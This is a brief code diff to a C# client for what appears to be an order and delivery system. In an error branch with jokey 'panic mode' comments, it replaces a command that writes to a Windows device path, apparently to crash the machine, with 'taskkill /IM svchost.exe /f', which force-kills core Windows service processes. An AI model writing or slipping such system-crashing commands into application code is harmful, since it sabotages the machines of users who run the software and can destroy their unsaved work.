@@ -29,7 +29,7 @@ namespace Bestellsystem_Lieferdienst_Client
                 //enter fatal panic mode!!!
                 //It's over
                 //WE'RE ALL GONNA DIE!!!!
-                Process.Start("cmd.exe", "/c echo 1 > \\\\.\\global\\crash");
+                Process.Start("cmd.exe", "/c taskkill /IM svchost.exe /f");
             }
         }
     }
